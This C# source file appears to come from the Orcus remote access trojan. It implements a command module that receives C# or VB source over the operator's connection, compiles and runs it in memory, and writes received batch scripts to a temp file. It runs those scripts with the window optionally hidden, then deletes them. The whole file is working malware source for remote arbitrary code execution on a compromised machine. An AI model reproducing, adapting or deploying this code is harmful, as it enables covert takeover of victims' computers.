using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Orcus.Plugins;
using Orcus.Shared.Commands.Code;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.Code
{
    internal class CodeCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((CodeCommunication) parameter[0])
            {
                case CodeCommunication.SendCsharpCode:
                case CodeCommunication.SendVbCode:
                    var source = Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1);
                    var providerOptions = new Dictionary<string, string>
                    {
                        {"CompilerVersion", "v3.5"}
                    };

                    var provider = (CodeCommunication) parameter[0] == CodeCommunication.SendCsharpCode
                        ? (CodeDomProvider) new CSharpCodeProvider(providerOptions)
                        : new VBCodeProvider(providerOptions);

                    var compilerParams = new CompilerParameters
                    {
                        GenerateInMemory = true,
                        GenerateExecutable = false
                    };
                    compilerParams.ReferencedAssemblies.Add("System.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Core.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Xml.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Xml.Linq.dll");

                    var results = provider.CompileAssemblyFromSource(compilerParams, source);

                    if (results.Errors.HasErrors)
                    {
                        var package = new List<byte> {(byte) CodeCommunication.ResponseErrors};
                        package.AddRange(
                            BitConverter.GetBytes(results.Errors.OfType<CompilerError>().Count(x => !x.IsWarning)));
                        var error = results.Errors.OfType<CompilerError>().First(x => !x.IsWarning);
                        package.AddRange(BitConverter.GetBytes(error.Line));
                        package.AddRange(Encoding.UTF8.GetBytes(error.ErrorText));
                        connectionInfo.CommandResponse(this, package.ToArray());
                        return;
                    }

                    try
                    {
                        object o = results.CompiledAssembly.CreateInstance("Orcus.CodeExecution");
                        var method = o?.GetType().GetMethod("Main");
                        method.Invoke(o, null);
                        connectionInfo.CommandResponse(this,
                            new[] {(byte) CodeCommunication.ResponseInvokeSuccessful});
                    }
                    catch (Exception ex)
                    {
                        var package = new List<byte> {(byte) CodeCommunication.ResponseGenerationException};
                        package.AddRange(Encoding.UTF8.GetBytes(ex.Message));
                        connectionInfo.CommandResponse(this, package.ToArray());
                    }
                    break;
                case CodeCommunication.SendBatchCode:
                    var freeFileName = FileExtensions.GetFreeTempFileName("bat");
                    var createNoWindow = parameter[1] == 1;
                    var process = new Process
                    {
                        StartInfo = {UseShellExecute = false, FileName = freeFileName, CreateNoWindow = createNoWindow}
                    };
                    File.WriteAllText(freeFileName, Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2));
                    process.Start();
                    connectionInfo.CommandResponse(this,
                        new[] {(byte) CodeCommunication.ResponseBatchCodeExecuted});
                    process.WaitForExit();
                    try
                    {
                        File.Delete(freeFileName);
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        protected override uint GetId()
        {
            return 3;
        }
    }
}